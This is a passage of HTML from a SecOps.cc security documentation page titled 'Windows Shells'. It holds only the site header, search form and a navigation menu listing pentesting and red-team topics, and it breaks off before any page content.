<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SecOps.cc is an information security platform designed to cover various offensive & defensive security topics"><meta name=author content=dh><link href=https://secops.cc/shells_payloads/windows_shells/ rel=canonical><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.3.1, mkdocs-material-8.1.4"><title>Windows Shells - SecOps.cc</title><link rel=stylesheet href=../../assets/stylesheets/main.bb3983ee.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#enumerating-windows class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=SecOps.cc class="md-header__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> SecOps.cc </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Windows Shells </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../docs/ class="md-tabs__link md-tabs__link--active"> Docs </a> </li> <li class=md-tabs__item> <a href=../../blog/ class=md-tabs__link> Blog </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=SecOps.cc class="md-nav__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> SecOps.cc </label> <div class=md-nav__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <div class="md-nav__link md-nav__link--index "> <a href=../../docs/ >Docs</a> <label for=__nav_2> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Docs data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Docs </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Cheatsheets <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2_1 type=checkbox id=__nav_2_2_1> <label class=md-nav__link for=__nav_2_2_1> Pentesting/CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pentesting/CTF data-md-level=3> <label class=md-nav__title for=__nav_2_2_1> <span class="md-nav__icon md-icon"></span> Pentesting/CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet-77/ class=md-nav__link> Commands </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/linux_shortcuts/ class=md-nav__link> Linux Shortcuts </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/windows/ class=md-nav__link> Windows </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/shells_payloads/ class=md-nav__link> Shells & Payloads </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_requests/ class=md-nav__link> Web requests </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/deobfuscation/ class=md-nav__link> (De)Obfuscation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/brute_forcing/ class=md-nav__link> Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/common_apps/ class=md-nav__link> Common Applications </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_attacks/ class=md-nav__link> Web Attacks </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/file_transfer/ class=md-nav__link> File Transfer </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/win_privesc/ class=md-nav__link> Windows Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/footprinting/ class=md-nav__link> Footprinting </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3> Red Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1 type=checkbox id=__nav_2_3_1> <label class=md-nav__link for=__nav_2_3_1> Footprinting <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_2_3_1> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/domain_information/ class=md-nav__link> Domain Information </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_2 type=checkbox id=__nav_2_3_1_2> <label class=md-nav__link for=__nav_2_3_1_2> Host Based Enumeration <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/smb/ class=md-nav__link> SMB </a> </li> <li class=md-nav__item> <a href=../../footprinting/nfs/ class=md-nav__link> NFS </a> </li> <li class=md-nav__item> <a href=../../footprinting/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../footprinting/smtp/ class=md-nav__link> SMTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/imap_pop3/ class=md-nav__link> IMAP/POP3 </a> </li> <li class=md-nav__item> <a href=../../footprinting/snmp/ class=md-nav__link> SNMP </a> </li> <li class=md-nav__item> <a href=../../footprinting/mysql/ class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/mssql/ class=md-nav__link> MSSQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/ipmi/ class=md-nav__link> IPMI </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_3 type=checkbox id=__nav_2_3_1_3> <label class=md-nav__link for=__nav_2_3_1_3> Remote Management Protocols <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/linux_remote_management_protocol/ class=md-nav__link> Linux </a> </li> <li class=md-nav__item> <a href=../../footprinting/windows_remote_management_protocol/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2 type=checkbox id=__nav_2_3_2> <label class=md-nav__link for=__nav_2_3_2> OS Basics <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="OS Basics" data-md-level=3> <label class=md-nav__title for=__nav_2_3_2> <span class="md-nav__icon md-icon"></span> OS Basics </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_1 type=checkbox id=__nav_2_3_2_1> <label class=md-nav__link for=__nav_2_3_2_1> Basics Linux <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Linux" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_1> <span class="md-nav__icon md-icon"></span> Basics Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_linux/linux/ class=md-nav__link> Linux </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_2 type=checkbox id=__nav_2_3_2_2> <label class=md-nav__link for=__nav_2_3_2_2> Basics Windows <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Windows" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_2> <span class="md-nav__icon md-icon"></span> Basics Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_windows/windows/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3 type=checkbox id=__nav_2_3_3> <label class=md-nav__link for=__nav_2_3_3> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_2_3_3> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1 type=checkbox id=__nav_2_3_3_1> <label class=md-nav__link for=__nav_2_3_3_1> Windows PrivEsc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows PrivEsc" data-md-level=4> <label class=md-nav__title for=__nav_2_3_3_1> <span class="md-nav__icon md-icon"></span> Windows PrivEsc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/tools/ class=md-nav__link> Useful Tools </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_2 type=checkbox id=__nav_2_3_3_1_2> <label class=md-nav__link for=__nav_2_3_3_1_2> Getting the Lay of the Land <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_2> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/gtlotl/ class=md-nav__link> Situational Awareness </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/init_enum/ class=md-nav__link> Initial Enumeration </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/comm_with_ps/ class=md-nav__link> Communication with Processes </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_3 type=checkbox id=__nav_2_3_3_1_3> <label class=md-nav__link for=__nav_2_3_3_1_3> Windows User Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_3> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/seimpersonate_seassignprimarytoken/ class=md-nav__link> SeImpersonate and SeAssignPrimaryToken </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/sebugpriv/ class=md-nav__link> SeDebugPrivilege </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/setakeownershippriv/ class=md-nav__link> SeTakeOwnershipPrivilege </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_4 type=checkbox id=__nav_2_3_3_1_4> <label class=md-nav__link for=__nav_2_3_3_1_4> Windows Group Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_4> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/builtin_groups/ class=md-nav__link> Windows Built-in Groups </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/eventlog_readers/ class=md-nav__link> Event Log Readers </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/dnsadmins/ class=md-nav__link> DnsAdmins </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/hyperv_admins/ class=md-nav__link> Hyper-V Administrators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/print_operators/ class=md-nav__link> Print Operators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/server_operators/ class=md-nav__link> Server Operators </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_5 type=checkbox id=__nav_2_3_3_1_5> <label class=md-nav__link for=__nav_2_3_3_1_5> Attacking the OS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_5> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/user_account_control/ class=md-nav__link> User Account Control </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/weak_permissions/ class=md-nav__link> Weak Permissions </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/kernel_exploits/ class=md-nav__link> Kernel Exploits </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/vulnerable_services/ class=md-nav__link> Vulnerable Services </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_6 type=checkbox id=__nav_2_3_3_1_6> <label class=md-nav__link for=__nav_2_3_3_1_6> Credential Theft <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_6> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/credential_hunting/ class=md-nav__link> Credential Hunting </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/other_files/ class=md-nav__link> Other Files </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/further_credential_theft/ class=md-nav__link> Further Credential Theft </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_7 type=checkbox id=__nav_2_3_3_1_7> <label class=md-nav__link for=__nav_2_3_3_1_7> Additional Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_7> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/interacting_with_users/ class=md-nav__link> Interacting with Users </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/miscellaneous_techniques/ class=md-nav__link> Miscellaneous Techniques </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_8 type=checkbox id=__nav_2_3_3_1_8> <label class=md-nav__link for=__nav_2_3_3_1_8> EOL Systems <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="EOL Systems" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_8> <span class="md-nav__icon md-icon"></span> EOL Systems </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/windows_server/ class=md-nav__link> Windows Server </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/windows_desktop/ class=md-nav__link> Windows Desktop </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_4 type=checkbox id=__nav_2_3_4> <label class=md-nav__link for=__nav_2_3_4> File Transfers <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_2_3_4> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_transfers/methods/ class=md-nav__link> Methods </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_5 type=checkbox id=__nav_2_3_5> <label class=md-nav__link for=__nav_2_3_5> Networking <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Networking data-md-level=3> <label class=md-nav__title for=__nav_2_3_5> <span class="md-nav__icon md-icon"></span> Networking </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../networking/overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_6 type=checkbox id=__nav_2_3_6> <label class=md-nav__link for=__nav_2_3_6> Login Brute Forcing <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Login Brute Forcing" data-md-level=3> <label class=md-nav__title for=__nav_2_3_6> <span class="md-nav__icon md-icon"></span> Login Brute Forcing </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../login_brute_forcing/basic_http_auth_brute_forcing/ class=md-nav__link> Basic HTTP Auth Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/web_forms_brute_forcing/ class=md-nav__link> Web Forms Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/service_authentication/ class=md-nav__link> Service Authentication Attacks </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_7 type=checkbox id=__nav_2_3_7> <label class=md-nav__link for=__nav_2_3_7> Atk Common Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Common Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_7> <span class="md-nav__icon md-icon"></span> Atk Common Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_common_apps/setting_the_stage/ class=md-nav__link> Setting the Stage </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/content_management_systems/ class=md-nav__link> Content Management Systems </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/containers_software_dev/ class=md-nav__link> Servlet Containers/Software Development </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/infra_network_monitoring_tools/ class=md-nav__link> Infrastructure/Network Monitoring Tools </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/cs_config_mgmt/ class=md-nav__link> Customer Service Mgmt & Configuration Mgmt </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/closing_out/ class=md-nav__link> Closing Out </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_8 type=checkbox id=__nav_2_3_8> <label class=md-nav__link for=__nav_2_3_8> Atk Web Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Web Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_8> <span class="md-nav__icon md-icon"></span> Atk Web Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_web_applications/http_verb_tampering/ class=md-nav__link> HTTP Verb Tampering </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/idor/ class=md-nav__link> Insecure Direct Object References </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/xxe/ class=md-nav__link> XML External Entity (XXE) Injection </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/sql_injection/ class=md-nav__link> SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9 type=checkbox id=__nav_2_3_9> <label class=md-nav__link for=__nav_2_3_9> Server Side Atks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Server Side Atks" data-md-level=3> <label class=md-nav__title for=__nav_2_3_9> <span class="md-nav__icon md-icon"></span> Server Side Atks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_1 type=checkbox id=__nav_2_3_9_1> <label class=md-nav__link for=__nav_2_3_9_1> SSRF 